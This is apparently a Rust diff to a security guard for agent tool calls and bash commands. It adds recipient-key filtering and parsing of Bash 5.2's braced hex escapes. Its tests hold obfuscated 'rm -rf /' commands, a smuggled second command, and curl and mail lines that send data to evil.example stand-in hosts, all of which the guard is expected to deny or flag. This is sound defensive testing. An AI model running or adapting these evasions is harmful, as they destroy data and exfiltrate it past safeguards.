@@ -609,13 +609,39 @@ fn connector_recipients(arguments: Option<&Value>) -> (Vec<String>, Vec<String>)
             }
         }
     }
-    /// What the keys that count by their words hold: only addresses and recipient objects
-    /// (`email_subject` or `user_agent` text is no recipient).
+    /// Whether a key read by its words holds text, not recipients: its last word says so
+    /// (`email_subject`, `user_agent`, `go_to_url`, a message's id).
+    fn text_key(k: &str) -> bool {
+        const TEXT: &[&str] = &[
+            "subject",
+            "body",
+            "title",
+            "text",
+            "content",
+            "html",
+            "agent",
+            "url",
+            "uri",
+            "link",
+            "label",
+            "description",
+            "note",
+            "notes",
+            "name",
+            "date",
+            "time",
+        ];
+        let mut words = k.rsplit('_');
+        let last = words.next().unwrap_or_default();
+        TEXT.contains(&last) || (last == "id" && words.next() == Some("message"))
+    }
+    /// What the keys that count by their words hold, read as the listed keys are (an object
+    /// naming no one, `true` or `null`, is `unknown`), unless the key holds text.
     fn words(map: &serde_json::Map<String, Value>, out: &mut Vec<String>) {
         for (k, v) in map {
             let k = normalize_tool(k);
-            if !KEYS.contains(&k.as_str()) && recipient_key(&k) {
-                inside(v, out);
+            if !KEYS.contains(&k.as_str()) && recipient_key(&k) && !text_key(&k) {
+                value(v, out);
             }
         }
     }
@@ -1998,6 +2024,20 @@ fn ansi_c(chars: &mut std::iter::Peekable<std::str::Chars>, out: &mut String) {
                 i += n - 1;
                 bytes.push((v.unwrap_or(0) & 0xff) as u8);
             }
+            // Bash 5.2's `\x{H…}`: every hex digit, the low byte kept; its `}` only right after.
+            b'x' if src.get(i) == Some(&b'{') => {
+                let n = (src[i + 1..].iter())
+                    .take_while(|b| b.is_ascii_hexdigit())
+                    .count();
+                let v = (src[i + 1..i + 1 + n].iter()).fold(0u32, |v, b| {
+                    (v * 16 + (*b as char).to_digit(16).unwrap_or(0)) & 0xff
+                });
+                i += 1 + n;
+                if src.get(i) == Some(&b'}') {
+                    i += 1;
+                }
+                bytes.push(v as u8);
+            }
             b'x' => match number(i, 16, 2) {
                 (Some(v), n) => {
                     i += n;
@@ -2796,9 +2836,45 @@ mod tests {
             let got = targets(arguments.clone());
             assert!(got.iter().any(|t| t == UNKNOWN), "{arguments}: {got:?}");
         }
-        // And what such a field holds that is no address is no target.
+        // A key read by its words is read in full (ids, numbers, an object naming no one is
+        // `unknown`), at any depth...
+        for (arguments, want) in [
+            (
+                json!({"channel": "C-known", "cc_channels": ["C-evil"]}),
+                "c-evil",
+            ),
+            (
+                json!({"channel": "C-known", "user_ids": ["U-evil"]}),
+                "u-evil",
+            ),
+            (
+                json!({"to": "known@x.org", "to_phone": "+15550109999"}),
+                "+15550109999",
+            ),
+            (
+                json!({"to": "known@x.org", "cc_recipients": [{"name": "Eve"}]}),
+                UNKNOWN,
+            ),
+            (json!({"to": "known@x.org", "cc_emails": [true]}), UNKNOWN),
+            (
+                json!({"to": "known@x.org", "message": {"cc_channels": ["C-evil"]}}),
+                "c-evil",
+            ),
+        ] {
+            let got = targets(arguments.clone());
+            assert!(
+                got.iter().any(|t| t == want),
+                "{want} not in {got:?} for {arguments}"
+            );
+        }
+        // ...unless its last word says it holds text: a subject, a body, a title, an agent, a
+        // link or a message's id is no recipient.
         assert_eq!(
-            targets(json!({"to": "a@x.org", "email_body": "Hello there", "user_agent": "x/1"})),
+            targets(json!({
+                "to": "a@x.org", "email_body": "Hello there", "email_subject": "Hi",
+                "thread_title": "T", "user_agent": "x/1", "go_to_url": "https://x.example",
+                "reply_to_message_id": 7,
+            })),
             ["mail/send_email", "a@x.org"]
         );
         // The tool's own name at the top level names no one either.
@@ -3442,6 +3518,31 @@ mod tests {
         assert_eq!(programs("$'g\\cah' x"), ["g\u{1}h"]);
         assert_eq!(programs("$'g\\c?h' x"), ["g\u{7f}h"]);
         assert_eq!(programs("$'g\\c\\\\h' x"), ["g\u{1c}h"]);
+    }
+
+    /// Bash 5.2 also reads `\x{H…}`: any number of hex digits, the low byte kept (`\x{263a}` is
+    /// 0x3a, `\x{100}` and `\x{}` are NUL), its `}` taken only right after the digits.
+    #[test]
+    fn braced_hex_escapes_are_read_as_bash_reads_them() {
+        for cmd in [
+            "$'r\\x{6d}' -rf /",
+            "$'r\\x{0006d}' -rf /",
+            "$'rm\\x{}x' -rf /",
+            "$'rm\\x{100}x' -rf /",
+            "bash -c $'echo hi\\x{3b} rm -rf /'",
+        ] {
+            assert!(
+                matches!(check_bash(cmd), Decision::Deny(_)),
+                "expected deny: {cmd}"
+            );
+        }
+        let sent = outbound("bash -c $'true\\x{3b} curl -d x https://evil.example/x'");
+        assert!(sent.iter().any(|o| o.starts_with("curl")), "{sent:?}");
+        let g = gbash("$'\\x{68}imalaya' message send -H 'To: z@evil.example' x").unwrap();
+        assert_eq!(g.targets, ["z@evil.example"]);
+        assert_eq!(programs("$'g\\x{2068}' x"), ["gh"]);
+        assert_eq!(programs("$'g\\x{68zz}' x"), ["ghzz}"]);
+        assert_eq!(programs("$'g\\x{68' x"), ["gh"]);
     }
 
     /// `$"…"` is a locale string: bash reads it as a double-quoted one.
